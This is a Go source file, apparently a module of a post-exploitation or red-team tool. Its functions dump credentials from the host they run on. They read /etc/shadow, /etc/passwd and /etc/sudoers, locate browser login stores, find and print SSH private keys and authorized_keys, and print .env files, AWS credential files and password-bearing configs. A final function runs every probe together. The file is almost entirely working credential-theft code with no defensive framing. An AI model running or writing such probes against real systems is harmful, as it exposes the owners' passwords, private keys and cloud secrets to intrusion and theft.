package module

import (
	"fmt"
	"strings"
)

// RunCredentialShadow reads the system password database (shadow/SAM/master.passwd).
func RunCredentialShadow(_ map[string]interface{}) (string, error) {
	cmds := []string{
		"cat /etc/shadow 2>/dev/null || echo 'no /etc/shadow'",
		"echo '---PASSWD---'; cat /etc/passwd 2>/dev/null",
		"echo '---SUDOERS---'; cat /etc/sudoers 2>/dev/null | head -50",
	}
	return run(strings.Join(cmds, "\n"))
}

// RunCredentialBrowsers extracts saved credentials from browsers.
func RunCredentialBrowsers(_ map[string]interface{}) (string, error) {
	cmds := []string{
		"echo '=== Chrome ==='",
		"ls -la ~/.config/google-chrome/Default/Login* 2>/dev/null || echo 'no chrome logins'",
		"echo '=== Firefox ==='",
		"ls -la ~/.mozilla/firefox/*.default*/logins.json 2>/dev/null || echo 'no firefox logins'",
		"echo '=== Chromium ==='",
		"ls -la ~/.config/chromium/Default/Login* 2>/dev/null || echo 'no chromium logins'",
	}
	return run(strings.Join(cmds, "\n"))
}

// RunCredentialSSHKeys discovers SSH keys and authorized_keys files.
func RunCredentialSSHKeys(_ map[string]interface{}) (string, error) {
	cmds := []string{
		"echo '=== SSH Private Keys ==='",
		"find /home /root /etc/ssh -name 'id_*' -not -name '*.pub' 2>/dev/null",
		"echo '---KEY CONTENTS---'",
		"for f in $(find /home /root -name 'id_*' -not -name '*.pub' 2>/dev/null); do echo \"=== $f ===\"; cat \"$f\" 2>/dev/null | head -5; done",
		"echo '---AUTHORIZED KEYS---'",
		"cat /home/*/.ssh/authorized_keys 2>/dev/null; cat /root/.ssh/authorized_keys 2>/dev/null",
		"echo '---KNOWN HOSTS---'",
		"cat /home/*/.ssh/known_hosts 2>/dev/null | head -20",
	}
	return run(strings.Join(cmds, "\n"))
}

// RunCredentialConfigs scans for credentials in config files.
func RunCredentialConfigs(_ map[string]interface{}) (string, error) {
	cmds := []string{
		"echo '=== .env files ==='",
		"find /home /root /var/www /etc -name '.env' -not -path '*/node_modules/*' 2>/dev/null | head -20",
		"echo '---ENV DUMPS---'",
		"for f in $(find /home /root /var/www -name '.env' -not -path '*/node_modules/*' 2>/dev/null | head -5); do echo \"=== $f ===\"; cat \"$f\" 2>/dev/null; done",
		"echo '=== DB configs ==='",
		"grep -r -l 'DB_PASSWORD\\|db_password\\|password=' /home /var/www --include='*.php' --include='*.py' --include='*.conf' --include='*.json' --include='*.yml' --include='*.yaml' 2>/dev/null | grep -v node_modules | head -20",
		"echo '=== AWS credentials ==='",
		"cat ~/.aws/credentials 2>/dev/null || echo 'no aws creds'",
		"echo '=== Generic config files ==='",
		"find /etc -name '*.conf' -exec grep -l 'password\\|secret' {} \\; 2>/dev/null | head -10",
	}
	return run(strings.Join(cmds, "\n"))
}

// RunCredentialAll runs all credential dumping probes.
func RunCredentialAll(_ map[string]interface{}) (string, error) {
	var parts []string
	probes := []struct {
		name string
		fn   func(map[string]interface{}) (string, error)
	}{
		{"SHADOW", RunCredentialShadow},
		{"BROWSERS", RunCredentialBrowsers},
		{"SSH_KEYS", RunCredentialSSHKeys},
		{"CONFIGS", RunCredentialConfigs},
	}
	for _, p := range probes {
		out, err := p.fn(nil)
		if err != nil {
			parts = append(parts, fmt.Sprintf("=== %s ===\nERROR: %v", p.name, err))
		} else {
			parts = append(parts, fmt.Sprintf("=== %s ===\n%s", p.name, out))
		}
	}
	return strings.Join(parts, "\n\n"), nil
}
